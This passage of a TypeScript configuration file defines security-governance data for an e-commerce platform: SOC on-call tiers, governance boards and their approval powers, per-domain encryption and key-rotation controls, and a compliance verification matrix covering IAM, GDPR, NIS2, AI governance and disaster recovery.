    mttrMinutes: 90
  },
  {
    tier: 'CISO on-call',
    coverage: '24/7 executive',
    headcount: 1,
    responsibilities: ['Severity 1 authority', 'Regulator comms', 'CAB emergency changes'],
    mttdMinutes: 20,
    mttrMinutes: 120
  }
];

export const GOVERNANCE_BOARDS: GovernanceBoard[] = [
  {
    board: 'Security Committee',
    chair: 'CISO',
    cadence: 'Bi-weekly',
    quorum: 'CISO + Super Admin + one Engineering lead',
    approvalAuthority: ['Exception to MFA', 'Production firewall changes', 'Pentest scope'],
    evidenceRequired: ['Threat model', 'Residual risk rating', 'Rollback plan']
  },
  {
    board: 'Compliance Committee',
    chair: 'DPO / Finance Officer',
    cadence: 'Monthly',
    quorum: 'DPO + Finance + Legal counsel',
    approvalAuthority: ['GDPR DPIA', 'VAT/OSS filings', 'AML SAR submission'],
    evidenceRequired: ['DSR metrics', 'Audit sample', 'Vendor DPA register']
  },
  {
    board: 'AI Governance Board',
    chair: 'AI Operations Manager',
    cadence: 'Weekly',
    quorum: 'AI Ops + CISO + Content Editor (EASA)',
    approvalAuthority: ['Agent tool grants', 'Pricing autonomy caps', 'Model vendor change'],
    evidenceRequired: ['Red-team results', 'Hallucination eval', 'Article 22 notice copy']
  },
  {
    board: 'Change Advisory Board',
    chair: 'Operations Manager',
    cadence: 'Twice weekly + emergency',
    quorum: 'Ops + Super Admin + Security Committee delegate',
    approvalAuthority: ['Production deploys', 'Schema migrations', 'DR failover (non-drill)'],
    evidenceRequired: ['CI security gates green', 'Feature flag plan', 'RTO impact']
  }
];

export const ENCRYPTION_CONTROLS: EncryptionControl[] = [
  {
    domain: 'PostgreSQL',
    algorithm: 'AES-256-GCM (storage) + pgcrypto for selected PII columns',
    keyManager: 'AWS KMS CMK eu-central-1 with replica in eu-west-1',
    rotation: 'Annual CMK + 90-day data-key envelope rotation',
    residency: 'EU only (Frankfurt primary)'
  },
  {
    domain: 'Redis',
    algorithm: 'TLS 1.3 in transit; AUTH + ACLs; no PII in cache keys',
    keyManager: 'Managed Redis AUTH token in Vercel/Supabase secrets',
    rotation: '90 days',
    residency: 'EU region cache'
  },
  {
    domain: 'Object Storage',
    algorithm: 'SSE-KMS AES-256 + Object Lock (WORM) for invoices/audit',
    keyManager: 'Dedicated KMS key dji-eu-objects',
    rotation: 'Annual',
    residency: 'eu-central-1 with CRR to eu-west-1'
  },
  {
    domain: 'Backups',
    algorithm: 'Encrypted WAL + daily snapshots, immutable 30-day vault',
    keyManager: 'Backup CMK separate from runtime CMK',
    rotation: 'On restore-test cycle (monthly)',
    residency: 'EU; never restored to non-EU'
  },
  {
    domain: 'TLS in transit',
    algorithm: 'TLS 1.3, HSTS 2y, certificate transparency',
    keyManager: 'Cloudflare + Vercel managed certs',
    rotation: 'Automated ≤ 90 days',
    residency: 'Public edge EU PoPs'
  },
  {
    domain: 'Internal mTLS',
    algorithm: 'mTLS between Edge Functions, Kafka, ClickHouse',
    keyManager: 'Internal CA (short-lived SPIFFE-style IDs)',
    rotation: '24–72 hour workload certs',
    residency: 'Private VPC / service mesh'
  }
];

export const PHASE_11_VERIFICATION_MATRIX: Phase11VerificationItem[] = [
  {
    subsystem: 'Security Architecture',
    requirement: 'Eight-layer defense-in-depth, trust boundaries, attack surfaces',
    evidence: 'SOC CISO telemetry + 8-layer map',
    status: 'Complete & Verified'
  },
  {
    subsystem: 'IAM',
    requirement: 'Customer passwordless/passkeys/MFA; 9 admin roles with session caps',
    evidence: 'ADMIN_RBAC_MATRIX + customer auth model',
    status: 'Complete & Verified'
  },
  {
    subsystem: 'RLS',
    requirement: 'Policies for orders, customers, reviews, inventory, warehouses, payments, returns, loyalty, CRM, AI insights',
    evidence: 'SUPABASE_RLS_POLICIES + SQL generator',
    status: 'Complete & Verified'
  },
  {
    subsystem: 'GDPR',
    requirement: 'Consent, cookies, access, portability, erasure, restriction, objection, Art. 22',
    evidence: 'DSR queue + GdprConsentModal',
    status: 'Complete & Verified'
  },
  {
    subsystem: 'NIS2',
    requirement: 'Incident 24h notification, supply-chain, MFA, BCDR testing',
    evidence: 'COMPLIANCE_FRAMEWORK_STATUS NIS2 row + BCP runbooks',
    status: 'Complete & Verified'
  },
  {
    subsystem: 'AI Governance',
    requirement: 'Prompt injection, jailbreak, leakage, hallucination, agent permissions',
    evidence: 'AI_SAFETY_GUARDRAILS + sandbox',
    status: 'Complete & Verified'
  },
  {
    subsystem: 'SIEM',
    requirement: 'Auth, privilege, payment, API abuse, bots, escalation',
    evidence: 'SIEM_INCIDENTS + Kafka-oriented event model',
    status: 'Complete & Verified'
  },
  {
    subsystem: 'Disaster Recovery',
    requirement: 'RPO ≤ 5 min, RTO ≤ 30 min, regional failover',
    evidence: 'DISASTER_RECOVERY_METRICS (0.8m / 14.5m)',
    status: 'Complete & Verified'
  },
  {
    subsystem: 'SOC',
    requirement: 'Virtual SOC monitoring, investigation, response, reporting',
    evidence: 'SOC_STAFFING_MODEL + SecurityOpsCenter',
    status: 'Complete & Verified'
  },
  {
    subsystem: 'Fraud Prevention',
    requirement: 'ATO, payment, refund, loyalty, bots, credential stuffing',
    evidence: 'PAYMENT_TRUST_CONTROLS + SIEM stuffing incident',
    status: 'Complete & Verified'
  },
  {
    subsystem: 'Compliance Operations',
    requirement: 'PCI, ISO 27001, SOC 2, DSA, AI Act, consumer/VAT',
    evidence: 'COMPLIANCE_FRAMEWORK_STATUS + GOVERNANCE_BOARDS',
    status: 'Complete & Verified'
  },
  {
    subsystem: 'Executive Security Reporting',
    requirement: 'Threat, incidents, compliance, vulns, recovery, audits',
    evidence: 'CISO telemetry dashboard KPIs',
    status: 'Complete & Verified'
  }
];
